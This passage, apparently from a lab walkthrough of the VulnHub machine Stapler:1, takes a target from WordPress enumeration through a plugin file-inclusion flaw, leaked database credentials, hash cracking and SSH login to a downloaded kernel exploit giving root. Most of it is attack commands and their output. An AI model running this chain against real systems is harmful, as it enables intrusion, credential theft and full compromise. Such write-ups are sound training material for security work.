8. WordPress Enumeration

I used WPScan to enumerate WordPress users.

┌──(kindgod㉿kali)-[~/vulnhub/stapler]
└─$ wpscan --url https://192.168.1.102:12380/blogblog/ \
--enumerate u --disable-tls-checks

The following usernames were identified:

john
peter
admin
zoe
fred

During further WordPress enumeration, an Advanced Video Plugin 1.0 installation was identified.

Researching the plugin version with SearchSploit revealed a known Local File Inclusion vulnerability.

WordPress Plugin Advanced Video 1.0
Local File Inclusion

This provided a potential route to reading files from the underlying operating system.

9. Exploitation — Local File Inclusion

The vulnerable plugin was tested for arbitrary local file retrieval.

I first attempted to read:

/etc/passwd

The exploit returned the requested file through the application's upload path.

The resulting file contained the expected Linux account information:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

This confirmed that the Local File Inclusion vulnerability could be used to access files outside the intended WordPress application context.

10. Sensitive Configuration Disclosure

I then used the same vulnerability to retrieve the WordPress configuration file.

The contents disclosed database credentials:

define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');

The recovered credentials were:

Database: wordpress
Username: root
Password: plbkac
Host: localhost

This was a significant escalation in the attack chain because the credentials could potentially provide access to the application's underlying database.

11. MySQL Enumeration

The recovered credentials were tested against the MySQL service.

┌──(kindgod㉿kali)-[~/vulnhub/stapler]
└─$ mysql -h 192.168.1.102 -u root -pplbkac

After authentication, I selected the WordPress database and queried the WordPress users table.

mysql> use wordpress;

mysql> select user_login,user_pass from wp_users;

The database contained password hashes for several WordPress accounts:

john
peter
admin
zoe
fred

This demonstrated that compromise of the application's configuration had led to access to its backend database.

12. Credential Cracking

The recovered WordPress password hashes were exported for offline password analysis.

John the Ripper was used with the rockyou.txt wordlist:

┌──(kindgod㉿kali)-[~/vulnhub/stapler]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

One of the credentials was recovered as:

john : incorrect

The credential was subsequently tested against the SSH service.

13. Initial System Access

The recovered credential successfully authenticated to SSH:

┌──(kindgod㉿kali)-[~/vulnhub/stapler]
└─$ ssh john@192.168.1.102

john@192.168.1.102's password: incorrect

Welcome to Ubuntu 16.04 LTS

john@red:~$ id

uid=1002(john) gid=1002(john) groups=1002(john)

Initial system access was obtained as the low-privileged user:

john

At this point, the attack moved from remote application/network enumeration into local privilege-escalation analysis.

14. Local Enumeration

I identified the operating system and kernel version:

john@red:~$ uname -a

Linux red 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016
x86_64 x86_64 x86_64 GNU/Linux

The distribution information confirmed:

Ubuntu 16.04 LTS

The kernel version was:

4.4.0-21-generic

This was significant because the kernel was associated with a known local privilege-escalation vulnerability, CVE-2016-4557.

15. Privilege Escalation

For the controlled lab environment, I transferred the corresponding proof-of-concept to the target, extracted it, compiled it, and executed it.

john@red:~$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip

john@red:~$ unzip 39772.zip

john@red:~$ cd 39772/ebpf_mapfd_doubleput_exploit/

john@red:~$ sh compile.sh

john@red:~$ ./doubleput

I then verified the resulting privileges:

john@red:~$ id

uid=0(root) gid=0(root) groups=0(root),1002(john)

The privilege escalation was successful.

The attack had progressed from an unauthenticated network service to complete operating-system compromise.

16. Root Access and Flag Retrieval

With root privileges obtained, I accessed the root user's home directory:

root@red:~# cd /root

root@red:~# ls
flag.txt

The challenge flag was retrieved:

root@red:~# cat flag.txt

Congrats! You've rooted Stapler:1!
Thanks for playing!

This confirmed successful completion of the Stapler:1 challenge.

